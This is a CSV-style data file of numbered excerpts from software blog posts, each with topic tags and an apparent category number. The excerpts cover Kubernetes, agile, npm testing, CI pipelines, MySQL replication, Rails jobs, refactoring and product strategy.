1663,Capacity planning is a daunting task. It takes hundreds of hours to benchmark the application and predict the server usage. And any business growth and scaling needs is a repeat process. The infrastructures are usually provisioned in advance months before the expansion. This often results in poor usage and wasted money. K8s APIs automate the distribution of containers in the cluster to ensure best usage at all time. It leads to cost reduction and efficient operations. The energy spent on maintaining the applications can now be better spent on new features.,"['Docker', 'Kubernetes', 'Containerization', 'Containers', 'Cloud']",10
1664,"Lean management always starts at the end. A first and very important step of lean thinking is to recognize and define value from the customers point of view. What does the customer really need, what does he value and what is he willing to pay for ultimately? Agility in the sense of the Manifesto for Agile Software Development likewise focuses on customer value, but approaches the question of the proper value empirically and less analytically than this underlying lean principle suggests. Agile development means delivering a usable product increment at short intervals. Not only because it generates value sooner, but also and especially in order to learn whether and how well the customer is satisfied with it. Agile organizations like Amazon or Spotify are constantly trying out new ideas live on us, learning step by step what their customers value and what they do not value and how their products can be adapted and improved.","['Agile', 'Lean', 'Lean Management', 'Agile Manifesto']",12
1665,"I have seen even some of the best software authors make screw-ups, they publish something with missing files or missing dependencies, etc. This is what alpha/beta/rc releases are forbut the question still remainshow do you test your package in the format that your users will see? For the sake of the article, lets call your package ""x"", how do you test x properly before publishing? Most developers test their package just as it is in version control. The package is either tested locally or tested on some CI/CD server. But is this really how your package will be consumed by end-users? To test the package it its real format, we need to tarball it with npm pack and then install it to node_modules and then test it as a dependency of another package.","['JavaScript', 'Nodejs', 'NPM']",18
1666,"Lol, we never do anything in your current workspaces, we only rsync it to temporary folders. So you will never see random files pop up in your workspace that werent there before. I am looking at you `npm-debug.log`! Right now, its fairly sufficient to use r2g on the regular fs. But for packages with complex command line dependencies, e.g. if the package is a CLI tool, it might be useful to test on a naked/clean fs. r2g.docker is a work in progress, and not quite ready for mass consumption, whereas r2g is.","['JavaScript', 'Nodejs', 'NPM']",7
1667,Create a build definition with the following tasks for your environment.e.g. To test your Dev environment build add the following build tasks. Please note the configuration may change as per requirements: Visual Studio Build to build the solution2. Visual Studio Test to run the test cases3. Copy Files from Source directory to artifacts staging directory4. Publish Build artifacts from artifacts staging directory to deployment folder / shared location. Only the selected files from the Publish folder are copied to the shared path in this case.,"['Unit Testing', 'DevOps', 'Csharp', 'Alm', 'Build']",18
1668,"For the structs defined before a dummy JSON example is the following: Lets talk about business, because this part is very special for me and very important for the time invested in finding the best answer. I dont know if you faced this problem or not, or for you, maybe it is not a problem, but I really encountered some problems trying to import the config in a good way. There are many possibilities, but I had to face the dilemma to choose between two:passing the config object as a variable from __url__ to the final function, where I need to use it. This for sure is a good idea, because I pass that variable just for those instances which need it, so in this way I dont compromise speed quality. But this is very time consuming for development or refactoring, because I need to pass the config from one function to another one all the time, so in the end, you want to kill yourself, meeh., maybe not, but I still dont like it.declaring a global variable and using that instance everywhere I need. But this is not the best option at all in my opinion, because I have to declare a variable, for example in __url__ file, and later in the main function I need to Unmarshal() the JSON file, to put that content into the variable object declared as global. But guess what, maybe Im trying to call that object before its initialization is ready, so Ill have an empty object, with no real values, so in this case my app will crash.inject the config object directly where I need, and yes, this is my best option which fits perfectly with me. In __url__ file, at the end of it, I declare the following lines: What you need to know for this implementation is that I use a library called Configor which unmarshals a file, in our case a JSON, and loads it into a variable conf, which is returned.","['Golang', 'Web Services', 'Software Architecture', 'Software Engineering', 'API']",15
1669,"Every good product should start with a vision but its never too late to create onelike firing an arrow, you having to pull back before you can go forwards. Visions created after product launch will still add value, but make sure you communicate this with both your team and your customers. Know your vision and know where you are headed, then use this to help shape which features you do and which you dont. Dont prolong your product journey by developing features that dont align with your vision, instead focus on high-value, vision-aligned features and watch your product grow.2. Think Like a Detective As Product Managers, we like to think that each one of our customers feature requests has been put through the same stringent criteria that we would put our own ideas through. We assume that requests have been thoroughly thought-out, have passed an internal review board, users have been interviewed and all other avenues have been discounted. Unfortunately this is rarely the case.","['Product Management', 'Business', 'Technology', 'Software Development', 'Agile']",1
1670,"If you find yourself in this situation then you need to start clearing some of the dead-wood from your backlog and trying to find features that will deliver significant value. One of the ways my team and I do this is by placing each item on an effort vs. impact scale. Basically, you rate each item (roughly) on how long it will take to develop and how much business value it will add once developed. Plot a quadrant chart onto a whiteboard or screen and plot your items onto the chart.","['Product Management', 'Business', 'Technology', 'Software Development', 'Agile']",14
1671,"Although most of the micro-services world is involving immutable stateless applications, some of them are not. Stateful workloads demand to be reliably backed by some kind of disk volume. While the application container itself can be immutable and be replaced with newer versions or healthier instances of themselves, they would need the persistency of their data even with other replications. For that, Stateful Sets allow deployment of applications that require the use of the same node throughout their lifetime. It also retains its name; both the `hostname` inside of containers and the name in service discovery across the cluster. A Stateful Set of 3 Zoo Keepers can be named zk-1, zk-2 and zk-3 It can also be scaled to include additional members like zk-4, zk-5 etc Stateful Sets also manage Persistent Volume Claim(s) (disks connected to pods).","['Docker', 'Kubernetes', 'Containers', 'Container Orchestration', 'Introduction']",10
1672,"K8s core team has thought about the vast majority of applications that would use an orchestration system. While the majority require constant uptime to simultaneously server requests (e.g a web server), we sometimes need a batch of jobs to be spawned up and cleaned up once finished. A mini-serverless environment if you will. In order to achieve that in k8s, we can use the Job resource. Jobs are exactly what they sound, a workload that spins up containers to complete a specific work, and be destroyed on a successful completion. A good example can be a set of workers, reading jobs from a queue of data to be processed and stored. Once the queue is empty, the workers are no longer required, until the next batch is ready to be processed.","['Docker', 'Kubernetes', 'Containers', 'Container Orchestration', 'Introduction']",10
1673,"If you arent already familiar with the The Twelve-Factor App manifest, you should. One of the key concepts of modern applications, is being environment-less and configurable from injected environment variables. An application should be completely agnostic to its location. In order to achieve this important concept in k8s, were given Config Maps. These are essentially a lists of key-value environment variables which are passed to running workloads in order to determine different runtime behaviours. On the same scope, we have Secrets which are similar to normal configuration entries, except being encrypted to prevent leaks of sensitive information like keys, passwords, certificates etc.","['Docker', 'Kubernetes', 'Containers', 'Container Orchestration', 'Introduction']",15
1674,"Downloading the image, with everything installed, is a bit faster than running the SDK install process every time (unexpectedly only ~5% faster). Obviously, we will use the second approach with jangrewe/gitlab-ci-android image. Lets add this at the beginning of __url__ file: Caching Gradle folder between builds may reduce building time. When we add cache to our builds, each cached job will download and extract the cache at the beginning and upload the cache at the end. Sometimes the download-extract-archive-upload cache process may spend more time than it saves. So its possible that after making the build 30 seconds faster, it will make the whole job a minute longer. I suggest to test the pipeline with and without cache and compare the times. Add this __url__ file: The export GRADLE_USER_HOME is for Gradle, to use our work folder for storing Gradle files. Without it, the.gradle folder will not include everything we want to cache. Changing cache key will drop the previous cache, so for our purpose, we will use ${CI_PROJECT_ID} which will stay consistent between jobs.","['Continuous Integration', 'Android', 'Gitlab Ci', 'Deployment', 'Dropbox']",7
1675,"This is the stage where we build and sign our app. We want a real release build with an app that is signed with a real key. The problem is that we dont want to put our key inside the repository. To avoid that, we will use Git Lab CI/CD variables. We will store our secret keys and passwords inside the variables and they will be accessible only for our job runners. Its easy to store the keystore passwords and alias, but what are we going to do with the keystore file? We will store it as base64 string.","['Continuous Integration', 'Android', 'Gitlab Ci', 'Deployment', 'Dropbox']",18
1676,"We will use Zapier with Gmail integration for emails. Go to Zapier Home and click the Make a Zap! Create new webhook (Webhooks by Zapier), choose the Catch Hook option and then click Continue. Copy the URL provided by Zapier and save itthis URL will be used in later stages. Now Zapier will wait for our POST and the data will be used to send emails (its ok to use mock values, no need for real emails and content). Its important to send the POST request with the following JSON because the other scripts rely on this structure: Send a POST request, with this JSON, to the URL that was given by Zapier. Lets say your URL was __url__ Continue.","['Continuous Integration', 'Android', 'Gitlab Ci', 'Deployment', 'Dropbox']",6
1677,"Click the Continue button and fill the fields To, From Name, Subject, Body. Select the data that was received from our POST inside To, Subject, Body fields: Write whatever you want in the From Name field. My setup ended up looking like this: Hit the Continue button and Send To Test Gmail. If you get the green messageeverything is ok (you should also receive an email to provided address). Hit Finish, name your Zap and turn it on. Now lets make the real testuse your Zap URL to run the c URL request (or postman) again.","['Continuous Integration', 'Android', 'Gitlab Ci', 'Deployment', 'Dropbox']",15
1678,"To update the profile, we get a copy of the current endpoint profile, copy relevant information into it, then update the endpoint profile with the new information. Finally, we record an event to send the updated endpoint profile: To effect this change, I added two additional methods to my definition of an analytics service with the following implementation: When I do authentication, I can use record Successful Login to record this. The endpoint will get updated and the appropriate signal will be sent to Amazon Pinpoint. The _userauth.sign_in is a special event in Amazon Pinpoint for recording a successful authentication. Adding an update to the endpoint profile will enable you to count active users: The graphs themselves may be uninteresting. From a developer perspective, though, the daily active users and monthly active users graphs have upticks. That is caused by setting the user ID within the endpoint profile.","['AWS', 'Kotlin', 'Android App Development', 'Aws Amplify']",11
1679,"The final thing you may want to do is to tag each event with some location information. Step 1 is to create a location service. I separate out the location service into its own class that is injected via dependency injection. First, add the appropriate permissions into the app: You can use either coarse or fine grained location. For analytics, its generally good enough to be close, but you can use either level of granularity. The location service looks like this: Reality check: This is the wrong way to do this, but is illustrative. In a real application, you would be checking permissions, asking for permission to access location, recording the preference, and doing appropriate changes to the analytics.","['AWS', 'Kotlin', 'Android App Development', 'Aws Amplify']",15
1680,"The usual requirement for trading systems is low latency data ingestion. We extend this requirement with near real-time data storage and querying at scale. In the following list we will demonstrate what can be learned by conducting this tutorial: Ingest real-time trading data with low latency from globally scattered datasources / exchanges. Possibility to adopt data ingest worker pipeline location. Easily add additional trading pairs / exchanges. Solution: Dataflow + Xchange Reactive Websockets Framework Demonstrate an unbounded streaming source code that is runnable with multiple runners. Solution: Apache BEAMStrong consistency + linear scalability + super low latency for querying the trading data. Solution: Bigtable Easy and automated setup with project template for orchestration. Example of dynamic variable insertion from Terraform template into the GCP compute instance. Solution: Terraform Querying and visualization Execute time series queries on Bigtable visualize it in on the webpage. Solution: Python Flask + V __url__ + Google Big Table Python Client The source code is written in Java 8, Python 2.7, Java Script and we are using Maven, PIP for dependency/build management.","['Google Cloud Platform', 'Big Table', 'Dataflow', 'Beam', 'Terraform']",6
1681,"On the other hand, infrastructure orchestrations tools are responsible for the provisioning of server instances while delegating configuration tasks to other tools such as the ones discussed above. These orchestration tools are designed to make it easier to provision servers at scale using features, such as declarative formatting and state management, which make it ideal for this use case. Terraform and Cloudformation are examples of a few tools that come under this umbrella.3. When comparing Cloudformation with Terraform, the former is usually not a great choice. Cloudformation works only over AWS which restricts the users from using multiple cloud providers as part of the infrastructure. As Cloudformation is developed by AWS internally, it lacks backing from a large open source community which leads to slower bug fixes and limits the user to solutions only offered by AWS. Cloudformation code is also generally superfluous which makes it hard to manage and more vulnerable to errors when managing infrastructure on a large scale.","['DevOps', 'Terraform', 'Cloud Computing', 'AWS', 'Hashicorp']",10
1682,"Git Hub is more than just a simple code-hosting service. Business Insider first reported the story, I may actually have been second. Anyway fast forward a few days its actually happening. Its a milestone for software development because heres access to one of the most valuable groups in the world: Thats 27 million of the most valuable minds on the planet. What can full access to these repositories and people do for how Microsoft understand talent in the software developer vertical? Presumably coupled with the data of Linked In, this kind of information can help train Microsofts AI and its ability to acquire the right people to build its assault on AI in the cloud and the future. Microsoft, is not necessarily the cool company young developers want to work at.","['Microsoft', 'Software Development', 'Software Engineering', 'Technology', 'Business']",16
1683,"My SQL is one of the prominent open source RDBMSs. In the cases of traffic growth to DBMS and when in the cases of backing up data replication is there for the rescue. My SQL comes with a set of in-built replication mechanisms that can be utilized as the need arise. Mainly there are 2 replication setups, master-master replication, and master-slave replication. As the names imply master-master is used as a load balancing technique in the presence of high write load. In contrast, master-slave is utilized when read load is significantly high, and for data backup purposes. However, one can utilize both at the same time.","['MySQL', 'Mysql Server', 'Replication', 'Troubleshooting', 'Master Slave']",8
1684,"Lets get our hands dirty then. (The following commands are for Ubuntu 18.04, however, can follow the steps with your OSs corresponding commands)1. log in to the machine where My SQL master server is running and open __url__ file in an editor.2. Set bind-address to 0.0.0.0 to allow any connection. Usually, these lines can be found in the __url__ but they are commented out.","['MySQL', 'Mysql Server', 'Replication', 'Troubleshooting', 'Master Slave']",7
1685,"Note: Here we have used /var/log/mysql directory (this directory is owned by the mysql user). Anyhow you can use any directory. If a different location is used make sure that the mysql user owns the specified directory.5. Specify the DBs that need to be logged for replication. It should also be specified in __url__ file as follows,Note: Here you can specify more than one DB. Just add as many as you want separating them by commas. Another advantage is, binlog-do-db makes sure that the master writes only the statements corresponding to the specified DBs.4. Now we need to create a replication user in the My SQL server and grant slave replication privileges to that user.6. Now go to the DB that we wanna replicate. See the master status and dump the DB. Here what we are trying to achieve is to get a snapshot of the DB of which we know the replication log status (i.e. In a new terminal using mysqldump tool dump the DB.8. Unlock the tables and quit from mysql console.1. Get the sql dump file and restore the DB in slave My SQL server. For that you might need to download the db_ __url__ file into the machine where you have the slave My SQL server. Then log into the mysql console and source the db_ __url__ file as follows,Note: If you want to replicate more than one DBs you need to get the dumps of those DBs as well and restore them in the slave server.2. Repeat the steps 1, 2, 3 and 4 of Setting Up master. This time as the server-id use a different positive integer. Typically masters get the first integers and slaves get the following integers. For an example, for the slave use 2 as the server-id because we used 1 as the master server-id.","['MySQL', 'Mysql Server', 'Replication', 'Troubleshooting', 'Master Slave']",7
1686,"Several authors have provided decision tree to help you decide whether you need a blockchain. Wst & Gervais give a decision flow of six questions in an excellent academic paper. The Linux Foundation published a list of seven somewhat different questions based on experience with Hyperledger Fabric proof-of-concept projects. And a recent NIST report gives a list of seven, again slightly different questions, based on an extensive technology survey. These questionnaires all include important questions but they are not the same. The lists are different because each includes some of the questions that become relevant after you have chosen for blockchain technology. The four core questions needed to make the decision are the same, but they are hidden in the larger lists. I give these core questions below, in the Do you need a blockchain?","['Blockchain', 'Decentralization', 'Immutability']",10
1687,"Imagine the following class and method: Now, you passed in your email provider, so thats something that you can test. The dependency is visible, as its right there in the constructor. But what about that Config Manager call? Well, one obvious improvement is to pass in the Config Manager as an interface. But lets take this to the next level. Why not just pass in the configuration itself? Youll notice a couple nice things. First, of course, the dependency on the configuration is explicit. Second, its strongly typed, which makes it easier to consume and prevents a whole class of errors. For example, from Address is a string, and the tooling will make that clear.","['Software Development', 'Dependency Injection']",15
1688,"Rookie Projects Managers tent to make project plans like nothing is going to be wrong during the project and the plan will be executed flawlessly. It is known that ships are out of course most of the time during a trip, but still, they manage to get to their destination. They make corrections during the trip. That is the first and biggest secret to handle changes. You must have a process to properly handle them.","['Agile', 'Software Development']",0
1689,"There are two ways to handle changes your own work processes, aka the methodologies and the software architecture, the technical part. For the technical part, I already write something about here: How do you write code that is extensible and maintainable when you dont know what new features and changes will be demanded in the future? On formal methodologies, the first phase of software development is the Analysis, and after it is done, it will produce all the documents needed for the project. If something changes after the analysis phase there was process call it change request to handle those situations. A lot of literature has been writing about this but the problem with that approach is that is very bureaucratic and time-consuming. Also, a lot of people are not properly trained and poorly execute this methodology which leads them to believe it doesnt work, but it does. For big projects, it is the way to work but for small or medium projects is overkill, I will not recommend it in those projects.","['Agile', 'Software Development']",12
1690,"There are things that lead to a lot of changes out of the scope of the methodologies. One is clients trying to implement improvements in their working processes because now we are creating software for them. Creating a new process is not an easy task, as we discuss. The process tends to get complicated very easily. Implementing working processes on the software es hard and expensive, trying to make improvements on the fly will lead you to mature those processes when trying to implement on production the software. Not having this vision will lead the client to have a false impression that the developers are doing a bad job. I usually dont let a client try to improve the processes, I always say: Lets first make the software work with the current processes you have, after we implement it then we improve all you want.","['Agile', 'Software Development']",12
1691,"Alfredo Pinto Molina Medium Also, as you can see, you can have hundreds or thousands of different scenarios for a given process. You and your client need to be very clever on this, not all the scenarios necessarily need to be implemented or are worth it. Once I buy an item on Amazon, and when I fulfill the address, I make a mistake and put a wrong street number. I communicate to the vendor to correct the mistake before the item was ship so it wont be delivered to the wrong place. In this case, the vendor instructs me that the order will be canceled, the credit card charge will be refunded and I will need to start over. For me it was like: It is just a simple correction, why cancel the whole order instead of just correct the address since the item hasnt been sent. Well, lets analyze it for a moment. Remember that every scenario must be coded, and coding costs a lot of money. If that scenario only happens very rarely it may not worth the money and the time invested on the coding to handle that situation, it will be cheaper to just cancel the order and hope that the client buys again the item (which I did and didnt mind). This shows us that the client and the developer's team needs to be very clever in which scenarios worth implementing to have a return of investment (pick your battles). It is better and cheaper to simplify the process than trying to make it robust.","['Agile', 'Software Development']",6
1692,"If you desire to add other pages, such as a login page, all you need to do is add another @app.route(), changing its argument for the desired route, and creating a method to be called when that route is accessed. To better understand that, have a look at the image bellow: Inside the app folder we need one last thing, the __url__ file, which tells python everything it will need to run our app. In this project, the file should look like this: So what is this __url__ file? This file is basically the backbone of Docker-Compose as it contains all the information needed to run the desired services. These services can pretty much be anything you want, in this example Ill only be running a container for the app itself, but you could also have other services, like a database, for example. In this project, well be using docker-compose version 2, as specified below: The app service declared on the __url__ needs some info to run properly:container_name Name of the container that will be created. context This directory is the build context that is sent to the Docker daemon.dockerfile Path to the Dockerfile of the service being run, in this case, apps D __url__ Expose ports. Either specify both ports (HOST: CONTAINER), or just the container port. In this case, flask utilizes port 5000 as default.","['Docker', 'Flask', 'Python Programming', 'API', 'Docker Compose']",7
1693,"If you want to customize these things, you can. Follow the doc step-by-step to learn many more features: __url__ API.","['JavaScript', 'Frontend', 'Cloud', 'Aws Amplify', 'Authentication']",19
1694,"How do we effectively visualize and see changes to software across commits and versions? How does one implement an effective code review of such graphical paradigms? How do collaborators compare and contrast their work against their colleagues branches? Imagine collaborating with a team of developers over a central repository using such graphical programming tools. If a commit is made and put up for reviewhow do multiple people review it simultaneously in an effective manner? Must they all individually download the proposed version and open it side-by-side another version and manually inspect the blocks and scan for differences? If methods to compare graphical code changes were to surface, how effective would they be? Comparing textual code across files using basic diff tools is quite effective and often easy to grasp depending on the number of changes. In graphical paradigms, can changes to nodes, locations and wiring be as easily interpreted as the red/green highlighting of text? Are typical screen sizes even a suitable canvas of which such differences can be rendered? Such challenges must be embraced if graphical paradigms are to be continually pursued.","['Git', 'Software Engineering', 'Software Development', 'Visual Programming', 'Version Control']",13
1695,"In particular, graphical coding paradigms need intermediary plugins and tools that stand between them and VCS in order to clearly visualize changes and comparisons. Furthermore these tools need to facilitate collaboration and design review. [1] Brooks, Frederick P., No Silver Bullet: Essence and Accidents of Software Engineering,. [Available here][2] Glass, Robert L. Silver Bullet Milestones in Software History.","['Git', 'Software Engineering', 'Software Development', 'Visual Programming', 'Version Control']",12
1696,"Now it has been eight months since I started my career at Perleybrook Labs as a software engineer. My perspective about my work and field has changed a lot after I joined the workforce. Thinking back, I really wish I knew all these lessons back during my college days. Actually, I knew some of them. I knew most of them But I didnt really understand the necessity of making them into practice.",[''],2
1697,"I always thought this was an unnecessary step in the world of coding. At college, I always skipped this part. But later on, when I went back and went through my older projects (written years ago), I understood the necessity. I myself couldnt quite get the context at many places! Basic writing skill plays a vital role in your programming. Code has to be well documented in order to convey what you wrote to others. And also to you after a break. This will help in making your projects maintainable.",[''],9
1698,"If writing code was only meant to tell computers to do things, zeroes and ones would have been the best. But it is much more than that. What if you left your company or current project team and some other developer has to work on your project? What if a change has to be made in your code? Code is read much more often than it is written. A device without a user manual is near useless!! These are some few simple lessons which I strongly recommend everyone to follow. Of course, even now my code is not perfect. Nevertheless, my coding style has come a long way. Coding is not like a factory, producing lots of output. It is an art which has some discipline. So next time, write code keeping in mind that your persona will be reflected through your code.",[''],9
1699,"Open source is no longer focused only on broad functionality that the masses require. There are now also open source projects focused on targeted, niche areas. Within the analytics world, for example, we have R and Python that cover a broad range of analytic capabilities. But we also have niche projects that address only certain aspects of the analytics process. These include projects like D3 for visualization and Scikit-learn for machine learning libraries. On the technology and operating system side, there are a wide array of options available ranging from Hadoop, to Spark, to Postgre SQL.","['Open Source', 'Analytics', 'Data Science']",10
1700,"For example, Hadoop was among the hottest, sexiest open source projects out there for a few years. There was no problem getting world class contributors to help Hadoop grow and expand very quickly. Today, however, Hadoop is becoming widely regarded as yesterdays news. Much of the contributor community may start to move on to other, sexier projects. This does not bode well for Hadoops ability to maintain enterprise readiness in the long term. Keep in mind that Hadoop is simply an illustrative example of the broader issue. Im not trying to pick on Hadoop.","['Open Source', 'Analytics', 'Data Science']",10
1701,"Our engineering team is supportive, caring, kind, humble, and gosh-darn-it, people like us. That makes for an incredibly rare and positive environment. A lot of engineering organizations optimize for technical prowess and/or speed of delivery at the price of hostility, drama, one-upmanship, and credit stealing. Its just not like that here. And this most excellent culture is one of the things that makes Creative Market a wonderful place to work. I have zero desire to take away that positive, friendly atmosphere.","['Startup', 'Engineering', 'Development']",2
1702,"Kyle Arch did not wait for a task to be assigned to him to begin working on improving our back end framework. He started experimenting and working through ideas in the cracks between other projects, looping in other engineers, and built what is becoming the foundation of our codebase moving forward. Alana Anderson, after moving to a squad that did not yet have a backlog of tasks, asked the team what else needed to be done and jumped onto an initiative to improve our on-boarding documentation for front end engineers. Working alongside other front end engineers, she created a process that is being used to get new engineers up and running with astonishing speed. Steven Rathbauer, when he had only been at Creative Market for a few days, realized our front end build process was slow and in need of updates. So he took it over and has continuously updated and improved it over the past year. Now it takes less than half the time it used to take to build and deploy front end assets.","['Startup', 'Engineering', 'Development']",12
1703,"So as we work to level up our engineering team as whole, that characteristic of urgency, care, and ownership will be the North Star for every engineer on the team. We all have room to grow, and we always will. The exact path forward and the end result will look different for each of us, of course, because each of us is unique. Homogeneity is not the goal; excellence is. But in the end, having this shared direction will empower our engineers to own and solve challenges within their realm of influence and to contribute their individual passions, skills, and dreams to push Creative Market to a new level of excellence.","['Startup', 'Engineering', 'Development']",12
1704,"A move in the direction of app-native OSS would inevitably lead to a profusion of new tools focused on a new set of concerns. I can venture some guesses on what tools we could expect: Data relationships would become a primary locus of activity. Most OSS activity around data is still in plumbing land, e.g. SQL and No SQL databases, message queues, streaming data platforms. App-native projects would instead be focused on application-specific data type constellations and the tooling around them. In recent years weve seen an intensified focus on type safety and validation in programming languages, schema definition languages la Graph QL and Protocol Buffers, and client libraries.","['Kubernetes', 'Cloud Native', 'Native App', 'Application Development', 'Software Architecture']",16
1705,"Its not a difficult concept to grasp, but its also not something we talk a lot about. The actual README for Active Job in Rails hints at this pattern: And its one Im happy to adopt. But theres more to it Ruby developers have adopted another useful pattern where they use Bang method declarations for things that are dangerous. For example methods that change the object they are called on vs. making a copy.name.downcase! vs. lowername = name.downcase Well, running code synchronously that should be run asynchronously is pretty far out there on the dangerous spectrum.","['Ruby on Rails', 'Software Development', 'Software Engineering', 'Code', 'Startup']",9
1706,"Its a huge reason I left the world of Java and EJBs behind for Ruby and Rails. Now, Rails still has its share of boilerplate, but these Active Job classes start to drive me nuts. Every time I want to run something asynchronously, I need to create a class and perform method thats 56 lines of code? So what I like to do is define a single Active Job like: And use it for every instance I need a job. All that Good Job class does us invoke whatever method its given asynchronously. So I have things like this in my code: Good Job.perform_later(self, send_to_youtube! )Without needing explicit Job classes every time.","['Ruby on Rails', 'Software Development', 'Software Engineering', 'Code', 'Startup']",9
1707,"Now, there used to be a helpful method in the days before Active Job that async libraries like Delayed Job and Sidekiq add to your models, in which you can skip my whole extra Good Job class. A simple delay method: Someone mentioned adding it to Active Job a couple years ago and it was shot down with if you dont use Job classes you wont know which Jobs are running. But one I have failed to bump into in practice. If its that tough, keep a __url__ file around to help keep track vs. loading more code into memory. Cristian was kind enough to give us the gem.","['Ruby on Rails', 'Software Development', 'Software Engineering', 'Code', 'Startup']",15
1708,"Personally, I dont like Freemium games but I bought it, or I need to say, I download them, play them and pay to win quickly some times. I think that the amount that Ive spend in that is no very important, my wife disagree of course, my relationship with it is a mix of hate-love feelings. When you know that, in some point they will offer you a deal that you wont resist anymore because the game is so hard, or boring or both to play without that precious goodies that are just a few dollars to get. So, now I can decide consciously when I buy a Freemium game to spend 50 dollars on it, but trying not to. Is like betting (when youre not sick about it): you decide to spend a few dollars doesnt matter if you lose or win, but you prefer to win and (If youre not insane) you have strict limits.","['Open Source', 'Software Development', 'Software As A Service', 'Community', 'Freemium']",17
1709,"The AWS SDK is pretty terrible. Functions are non-enumerable, modules need to be individually instantiated and configured, and functions dont follow asynchronous best practices. Errors have disembodied stack traces and dont even include the name of the called function, making simple debugging a hair-pulling experience. Even worse, module functions are not only unbound, but unbindable. We wrote the Sullux AWS SDK wrapper library to address these problems. It can be installed like this: The Sullux AWS SDK wraps the official AWS SDK, so you need to have the official SDK installed alongside.","['JavaScript', 'AWS', 'Aws Sdk']",7
1710,"Therefore youll hear a lot of people start to speak out, We need to refactor and improve the quality of our code. So how do we deal with it? While developing your code, make it as modular and small as possible. Apply the SOLID principles as a minimum (I have a previous article about this), and simplify the logic as much as you can. Take the extra effort right there and then, because it will save so many headaches later. If it cant be simplified, make it clear via comments why its so complicated, so that others who come along may at least understand your intent. They may even think of a better way to simplify your logic, if they know what you are intending.","['Software Development', 'Programming', 'Advice', 'Code Review', 'Development']",9
1711,"Once your code is in, get it reviewed by many (I dont care if it slows progress on other features in your sprint, take the time and do it right). Choose reviewers of different skillsets and levels of experience. Dont always pick the same people. Code reviews are not just to ensure you are writing the code right, but it also can teach others better ways to write certain logic too. We all have the ability to learn from other peoples code. In regards to reviews, drop the ego and accept others criticism. Once the review is done, discuss what needs to be adjusted with all reviewers and agree as a whole. At the end of the day, its your teams code base, not just yours.","['Software Development', 'Programming', 'Advice', 'Code Review', 'Development']",13
1712,"Once your code is merged, DO NOT refactor the code UNTIL or UNLESS, there are sufficient test coverage to support your changes. If there isnt sufficient tests already against that feature DO THAT FIRST. If you do not have quality checks in place and you plan to update a feature or worse, the core of the application, who knows what bugs you will introduce. No one on this planet writes perfect code that works all the time. It is also absolutely essential that you discuss with the QA/Tester on the team what you are changing and why, so that you can both discuss what the testing outcome will be from such a change, and cater your coded tests for it.","['Software Development', 'Programming', 'Advice', 'Code Review', 'Development']",13
1713,"If you are in the situation where writing tests is not an option, due to deadlines, just LEAVE THE CODE ALONE. If it works, dont touch it. Accept at this point it is technical debt, and if anyone asks about why its not changed, its because you couldnt add tests to support such a change. I know some companies work developers against tight deadlines, so dont hang yourselves by changing things that work, even if the code is bad. Its better to explain to your Product Owner / Project Manager why you dont wish to change it, and educate them on why its important to have tests in the first place, and to reduce the scope of work each sprint.","['Software Development', 'Programming', 'Advice', 'Code Review', 'Development']",13
1714,"When refactoring code, refactor small portions of the code at a time. DO NOT go with BIG BANG changes. If your code is modular enough, this should be easy to do. If not well thats your first step. Like anything, the less amount of work you put into a change, the easier it is to understand the implications of it, whether good or bad.","['Software Development', 'Programming', 'Advice', 'Code Review', 'Development']",9
1715,"So you might be asking, how often should we refactor code? I say at least something should be refactored once in a sprint. Reserve someone for a few hours in a 2 week period, and get them to change whatever is possible in those few hours. One other thing I have witnessed at some companies is teams will sit in a room and review the code in its entirety once a sprint. This also works well, and allows the team to identify what courses of action they can take for the next refactor cycle. You can even during that session agree on the best way to refactor a part of the code.","['Software Development', 'Programming', 'Advice', 'Code Review', 'Development']",1
1716,"These are the same files available under S3 bucket as well -Any changes done on the mounted drive from any of the EC2 instances get reflected immediately on the other EC2 instance as well as on S3. But changes done directly on S3 bucket doesnt get reflected on File Gateway immediately. For that one can make a call to AWS File Gateway API or UI to refresh the File Gateway as soon as a new object added/deleted in S3 bucket directly i.e. without going through the AWS File Gateway. For B2Bi/SFG use-cases, I dont expect anyone to write directly into the S3 bucket. The S3 Bucket should be treated as a system resource and only B2Bi/SFG should use that via AWS File Gateway which is nothing but the mounted drive.","['AWS', 'Ibm B2b Integrator', 'B2B', 'B2b Integration', 'Sterling Filegateway']",7
1717,"What caught my attention in your book is the term strategic integrity, referring to strategic alignment at a company. In cross-functional organizations, who is responsible to ensure strategic integrity? Who should be interpreting strategy into detailed actions? Im happy you picked up on that term. Its actually pretty funny, when we were writing the book, that is what I wanted the title to be. The problem was that the book publisher couldnt say that whole phrase without falling asleepstrategic integrity just sounds boring. But it was very important to me, so Im glad that you picked up on it.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",0
1718,"Every strategy has two components to it that are super important. One of them is that you have to be able to see it. Not every feature of a release or a product is visible but everybody should be able to watch a visualization of the product and understand where their work will contribute to that visualization. And that becomes sort ofin a favorite Silicon Valley phrasethe north star. The first step to having a strategy is showing it and its not like a quick demo you show once but something you come back to and measure yourself by in terms of success. Which brings us to the second point. The easiest way for people to understand it is to write something like a press release. It follows a formula and you see them in PR Business Wire all the time. This way, you have a visualization of the strategy and then a press release which has to be just 500 words. Now everybody knows whats supposed to be in the release.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",0
1719,"Thats an interesting question and there is an easy answer, which is, that deadlines are what the team wants it to be. The team is going to say how long something is going to take and if the feature is cool, it doesnt matter if they miss the deadline and negotiate a new deadline. This is very typical of how companies work when theyre early in life. Whether they are tiny seed-stage or even recently public companies. The difference is that in the march to product-market fit, you should basically just do whatever you want to do, because there is no one out there who cares what you do. Youre figuring out what they want.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",1
1720,"Things are different when you develop a customer base. This is when you need to start to have grown-up conversations about 1) what are we doing for our existing customers, 2) what are we doing to acquire new customers, and 3) what are we doing for the people who are watching what were doing and evaluating if what were doing is good. This last group are people we often forget about. There are a lot of people who watch what you do, and whether they use your product or will doesnt matter because they have a big voice and opinions. So as a company matures you need to start thinking about all of these groups and the impact that the work has on each. This is where you can get too risk-averse. Of course the flip side is that you can do what startups do and only increase your risk. The most famous example of this is move fast and break things. That was a really cool idea when there werent a billion people using a service and then all of a sudden the notion of break things really doesnt sound very cool. It sounds neat to get features all the time but if 1 out of n break the service or 1 out of n you have to back out, its not really cool anymore.","['Management', 'Product Market Fit', 'Data Science Teams', 'Cross Functional Teams', 'Product Management']",0
